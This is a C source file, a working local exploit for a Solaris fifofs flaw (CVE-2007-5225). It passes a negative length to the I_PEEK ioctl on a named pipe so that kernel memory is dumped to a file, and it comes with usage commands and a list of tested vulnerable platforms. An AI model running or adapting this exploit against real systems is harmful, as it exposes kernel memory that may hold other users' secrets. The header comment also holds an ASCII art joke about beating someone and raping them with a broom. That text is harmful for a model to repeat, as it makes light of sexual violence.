/*
 * $Id: raptor_peek.c,v 1.1 2007/10/18 08:08:29 raptor Exp $
 *
 * raptor_peek.c - Solaris fifofs I_PEEK kernel memory leak
 * Copyright (c) 2007 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * [Lame] integer signedness error in FIFO filesystems (named pipes) on Sun 
 * Solaris 8 through 10 allows local users to read the contents of unspecified 
 * memory locations via a negative value to the I_PEEK ioctl (CVE-2007-5225).
 *
 *        /\   AS PART OF A VAST WORLD-WIDE CONSPIRACY              
 *  hjm  /  \   I COMMAND THEE:  BEAT OFF UNTO ME                   
 *      /,--.\                                                      
 *     /< () >\   IF I SAY "FNORD" AT THE END OF A SENTENCE         
 *    /  `--'  \   DOES THAT MAKE ME REALLY FUNNY OR SOMEONE        
 *   /          \   WHO NEEDS TO GET FUCKING BEATEN TO NEAR         
 *  /            \   DEATH AND THEN RAPED WITH A BROOM              
 * /______________\                                                 
 *                  AS YOU CAN SEE THAT'S REALLY TWO JOKES IN ONE
 *                   SO YOU REALLY GET YOUR MONEY'S WORTH HERE   
 * Usage:
 * $ gcc raptor_peek.c -o raptor_peek -Wall
 * $ ./raptor_peek kerndump 666666
 * [...]
 * $ ls -l kerndump 
 * -rwx------   1 raptor   staff     666666 Oct 17 19:33 kerndump
 *
 * Vulnerable platforms (SPARC):
 * Solaris 8 without patch 109454-06 [tested]
 * Solaris 9 without patch 117471-04 [tested]
 * Solaris 10 without patch 127737-01 [tested]
 *
 * Vulnerable platforms (x86):
 * Solaris 8 without patch 109455-06 [untested]
 * Solaris 9 without patch 117472-04 [untested]
 * Solaris 10 without patch 127738-01 [untested]
 */

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <stropts.h>
#include <unistd.h>
#include <sys/stat.h>

#define	INFO1	"raptor_peek.c - Solaris fifofs I_PEEK kernel memory leak"
#define	INFO2	"Copyright (c) 2007 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	BADFIFO	"/tmp/fnord"
#define BUFSIZE 1000000

int 	errno;

int main(int argc, char **argv)
{
	int 		fd, fifo;
	size_t		out, bufsize = BUFSIZE;
	char		*buf;
	struct strpeek 	peek;

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc < 2) {
		fprintf(stderr, "usage: %s outfile [outsize]\n\n", argv[0]);
		exit(1);
	}
	if (argc > 2)
		if ((bufsize = atoi(argv[2])) == 0) {
			fprintf(stderr, "Error (atoi): invalid outsize\n");
			exit(1);
		}

	/* print some output */
	fprintf(stderr, "Using outfile\t: %s\n", argv[1]);
	fprintf(stderr, "Using outsize\t: %u\n\n", bufsize);

	/* prepare the output buffer */
	if ((buf = (char *)malloc(bufsize)) == NULL) {
		perror("Error (malloc)");
		fprintf(stderr, "Hint: Try again with a smaller output size\n");
		exit(1);
	}
	memset(buf, 0, bufsize);

	/* create the named pipe */
	unlink(BADFIFO);
	if (mknod(BADFIFO, S_IFIFO | S_IRWXU, 0) < 0) {
		perror("Error (mknod)");
		exit(1);
	}

	switch(fork()) {
	case -1: 	/* cannot fork */
		perror("Error (fork)");
		exit(1);
	case 0: 	/* the child writes */
		if ((fifo = open(BADFIFO, O_WRONLY, 0)) < 0) {
			perror("Error (open)");
			exit(1);
		}
		write(fifo, "FNORD", 5);
		exit(0);
	default: 	/* the parent reads */
		/* FALL THROUGH */
		;
	}

	/* perform the MAGICK */
	if ((fifo = open(BADFIFO, O_RDONLY, 0)) < 0) {
		perror("Error (open)");
		exit(1);
	}

	memset(&peek, 0, sizeof(peek));
	peek.databuf.buf = buf;
	peek.databuf.maxlen = -1; /* FNORD! */

	if (ioctl(fifo, I_PEEK, &peek) < 0 ) {
		perror("Error (ioctl)");
		close(fifo);
		exit(1);
	}

	/* save output to outfile */
	if ((fd = open(argv[1], O_RDWR | O_CREAT | O_TRUNC, 0700)) < 0) {
		perror("Error (open)");
		close(fifo);
		exit(1);
	}
	out = write(fd, buf, bufsize);

	fprintf(stderr, "FNORD! %u bytes written to %s\n", out, argv[1]);
	fprintf(stderr, "Hint: Try also with a bigger output size\n");

	/* cleanup (who cares about free?;) */
	close(fd);
	close(fifo);

	exit(0);
}
